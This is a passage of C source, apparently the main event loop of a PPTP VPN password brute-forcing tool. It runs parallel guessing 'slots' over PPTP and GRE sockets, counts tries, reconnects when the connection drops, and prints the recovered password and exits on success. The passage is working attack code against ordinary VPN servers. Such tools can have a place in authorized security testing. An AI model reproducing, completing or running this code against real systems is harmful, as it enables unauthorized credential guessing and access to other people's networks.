		DEBUGF("%d slots running, delay: %ld.%6.6ld\n", slots_running, tv.tv_sec, tv.tv_usec);
		n = select(maxfd + 1, &rfds, NULL, NULL, &tv);
		gettimeofday(&opt.tv_now, NULL);
		if (n < 0)
			PERREXIT("select");
		/* Timeout is handled at beginning */
		if (n == 0)
		{
			continue;
		}

		if (FD_ISSET(pptp.sox, &rfds))
		{
			ret = pptp_read(&pptp, buf, sizeof buf);
			//DEBUGF("pptp_read returned %d\n", ret);
			/* FIXME: reestablish connection! */
			if (ret < 0)
			{
				printf("pptp connection dropped after %u tries!\n", opt.tries);
				printf("Trying to reconnect....\n");
				pptp_reconnect(gre_fd, &pptp);
				printf("Restarting %d running slots of %d available slots...\n", slots_running, opt.n_slots);
				for (i = 0; i < opt.n_slots; i++)
					if (slots[i].state >= SLOT_STATE_RESTARTABLE)
						slot_restart(&pptp, &slots[i]);
				continue;
			}
			if (ret > 0)
				dispatch(gre_fd, &pptp, buf, ret);
		}

		while (FD_ISSET(gre_fd, &rfds))
		{
			ret = gre_read(gre_fd, buf, sizeof buf, &call_id);
			//DEBUGF("GRE has something for me (ret = %d), call_id %d\n", ret, call_id);
			if (ret < 0)
				ERREXIT("gre_read socket closed. Firewall?\n");
			/* More data to read */
			if (ret == 0)
				break;
			slot = slot_lookup(call_id);
			/* FIXME: Must terminate LCP connectiopn */
			if (!slot)
			{
				/* If term req then just ack it. */
				/* Send terminate request.
				 * Reply with LCP-ACK on TERM-ACK
				 */
				break;
			}
			ret = gre_process(&slot->gre, buf, ret);
			if (ret < 0)
			{
				DEBUGF("recevied illegal PACKET (ret: %d)\n", ret);
				break;
			}
			/* ACK received. Never retransmit last packet */
			if (ret == 0)
			{
				DEBUGF("ACK RECEIVED, DESTROYING RESEND QUEUE..\n");
				slot->due.tv_sec += 99999;
				break;
			}
			if (gre_dispatch(gre_fd, &pptp, slot, buf, ret) == -1)
			{
				show_status();
				printf("Password is '%s'\n", slot->password);
				exit(0);
			}
			break;
		}
	}

	exit(0);
	return 0;
}

